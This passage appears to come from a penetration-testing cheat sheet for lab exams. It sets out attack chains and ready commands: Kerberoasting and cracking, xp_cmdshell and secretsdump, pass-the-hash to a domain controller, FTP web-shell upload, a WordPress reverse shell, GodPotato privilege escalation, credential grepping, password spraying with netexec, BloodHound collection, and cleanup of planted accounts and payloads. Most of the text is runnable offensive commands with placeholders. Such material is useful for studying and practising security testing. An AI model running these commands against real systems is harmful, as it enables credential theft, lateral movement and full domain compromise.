Initial domain creds -> Kerberoast SPN -> crack service account -> MSSQL login -> xp_cmdshell shell -> find Windows.old SAM/SYSTEM -> secretsdump -> PtH to DC.
```

Commands:

```bash
impacket-GetUserSPNs -request -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASS> -outputfile kerb.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
impacket-mssqlclient '<DOMAIN>/<SVC_USER>:<SVC_PASS>@<MSSQL_IP>' -windows-auth
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
evil-winrm -i <DC_IP> -u <ADMIN_USER> -H <NTLM_HASH>
```

---

### FTP/Webroot Overlap to Web Shell

```text
FTP write access -> upload PHP/ASPX shell -> browse web server path -> reverse shell -> local privesc.
```

Commands:

```bash
ftp <IP>
put shell.php
curl "http://<IP>:<PORT>/shell.php?cmd=whoami"
```

---

### WordPress Admin to RCE

```text
Valid WP admin -> Theme Editor -> replace 404.php with PHP reverse shell -> trigger template -> shell -> Windows/Linux privesc.
```

---

### Service Account with SeImpersonate

```text
Initial shell as service account -> whoami /priv -> SeImpersonatePrivilege -> GodPotato/PrintSpoofer -> SYSTEM.
```

Commands:

```cmd
whoami /priv
.\gp.exe -cmd "whoami"
.\gp.exe -cmd "cmd.exe /c C:\Windows\Temp\reverse.exe"
```

---

## 17. Post-Exploitation Checklist

### Linux

```bash
whoami && id && hostname
ip a && route && ss -antup
sudo -l
find / -perm -u=s -type f 2>/dev/null
/usr/sbin/getcap -r / 2>/dev/null
grep -RniE "pass|password|secret|token|key" /home /var/www /opt 2>/dev/null
find / -name proof.txt -o -name local.txt 2>/dev/null
```

### Windows

```cmd
whoami /all
whoami /priv
hostname
ipconfig /all
net user
net localgroup administrators
systeminfo
netstat -ano
dir C:\Users
dir C:\Windows.old
```

PowerShell:

```powershell
Get-ChildItem C:\Users -Recurse -Force -ErrorAction SilentlyContinue | Select-String -Pattern "password|username|secret|token|key"
```

### AD

```bash
nxc smb ips.txt -u '<USER>' -p '<PASS>'
nxc winrm ips.txt -u '<USER>' -p '<PASS>'
nxc rdp ips.txt -u '<USER>' -p '<PASS>'
nxc mssql ips.txt -u '<USER>' -p '<PASS>'
bloodhound-python -u '<USER>' -p '<PASS>' -ns <DC_IP> -d <DOMAIN> -c all --zip
```

---

## 18. Reporting Checklist

For every target:

```text
Target:
IP:
Hostname:
OS:
Open ports:
Initial access vector:
Privilege escalation vector:
Credentials found:
Proof path:
Commands used:
Screenshots captured:
Remediation:
```

Capture proof:

```bash
whoami
hostname
ipconfig /all
cat /root/proof.txt
type C:\Users\Administrator\Desktop\proof.txt
```

Take screenshots of:

```text
Nmap results
Exploit trigger
Initial shell user
Privilege escalation proof
local.txt
proof.txt
Important credential discovery
```

Cleanup lab-only artifacts when appropriate:

```cmd
net user hacker /delete
del C:\Windows\Temp\reverse.exe
del C:\Windows\Temp\winPEAS.exe
```

```bash
rm -f /tmp/linpeas.sh /tmp/pspy64 /tmp/reverse.elf
```


